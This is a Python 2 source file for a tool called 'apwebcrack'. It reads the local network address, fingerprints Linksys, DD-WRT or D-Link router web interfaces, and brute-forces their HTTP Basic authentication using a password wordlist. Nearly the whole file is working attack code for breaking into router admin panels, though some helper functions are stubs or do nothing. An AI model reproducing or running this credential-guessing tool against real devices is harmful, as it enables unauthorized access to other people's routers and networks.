#!/usr/bin/python
import sys
import socket
import base64
import time
import traceback
import fcntl
import struct
class apwebcrack:
    
    def __init__(self):
        self.wordlist = {}
        self.path = "/"
        self.authType="basic"
        self.fp = 0
        return None 
   
    def sendHttp(self,data):
        return 1

    def getNetMask(self,ifname):
        binif = struct.pack('256s',ifname[:15])
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        binmask = fcntl.ioctl(s.fileno(),0x891b,binif)
        self.netMask = socket.inet_ntoa(binmask[20:24])



    def getIpAddress(self,ifname):
        binif = struct.pack('256s',ifname[:15])
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        binip = fcntl.ioctl(s.fileno(),0x8915,binif)
        """
        prob a better way to find what i am looking for .. but this works :-)
        for char in range(len(binip)):
           print "Printing "+str(char)+":"+socket.inet_ntoa(binip[char:char+4])
        """
        self.ip = socket.inet_ntoa(binip[20:24])
        return 1

    
    def calcIPRange(self,ip,netmask):
        """This will have to wait"""
 
        
    def getHosts(self):
        ipArray = self.ip.split(".")
        bottom = ipArray[0]+"."+ipArray[1]+"."+ipArray[2]+"."+"1"
        top = ipArray[0]+"."+ipArray[1]+"."+ipArray[2]+"."+"254"
        return (bottom,top)


    def testConn(self):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(5)
            addr = (self.host,self.hostport)
            time.sleep(.2)
        except :
            traceback.print_exc() 
            print" [!] Connection Failed to "+self.host
            return 0
        return 1 
        

    def sendHTTP(self,httpmsg,recvlen):
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(5)
        addr = (self.host,self.hostport)
        sock.connect(addr)
        sock.send(httpmsg)
        input = ""
        if(recvlen > 0):
            input = sock.recv(recvlen)
        elif recvlen == None:
            while 1:
                data = sock.recv(1024)
                input += data
                if not data: break;
        sock.close()       
        return input


    def fingerPrint(self):
        print "[*] Attempting to identify AP"
        httpmsg =  "GET / HTTP/1.0\r\nHost: mrl.com\r\n\r\n"
        rec = self.sendHTTP(httpmsg,None)
        recArray = rec.split("\n")
        for line in recArray:
            if "Linksys" in line:
                self.fp = 1
                print "[+] Match : Linksys"
                self.authType="basic"
                self.path = "/"
                break;
            elif "DD-WRT" in line:
                self.fp = 1
                print "[+] Match : DD-WRT"
                self.authType="basic"
                self.path = "/Management.asp"
                break;
            elif "D-Link" in line:
                self.fp = 1
                print "[+] Match : D-Link"
                self.authType="basic"
                self.path = "/"
                break;

        if(self.fp == 0):
           print "[!] NO MATCH FOUND : Using Defaults"  

    def setHost(self,ip,port):
        self.host = ip 
        self.hostport = port 

    def loadWordList(self):
        try:
            fd = file("wificracklist.txt","r")
            index = 0;
            lines = fd.read()
            lineArray = lines.split("\n")
            index = 0;
            for line in lineArray:
                self.wordlist[index] = line
                index += 1
        except:
            print "Error Loading WifiCracklist"
            traceback.print_exc()
            pass
 
    def attemptAuth(self,authstring):


        if(self.authType == 'basic'):
            httpmsg = "GET "+self.path+" HTTP/1.0 \r\nAuthorization: Basic "+base64.encodestring(authstring)+"\r\n\r\n"
            rec = self.sendHTTP(httpmsg,2024)
            recArray = rec.split("\n")
            for line in recArray:
                if '200 Ok' in line:
                    return 1
            return 0
                          

 
    def bruteHost(self):
        self.fingerPrint()
        print "[*] Starting Brute Attack"
        for login in self.wordlist.keys():
            time.sleep(.2)
            if(self.attemptAuth(self.wordlist[login])):
                print "[*] Login Found: "+self.wordlist[login]
                sys.exit()
    
        

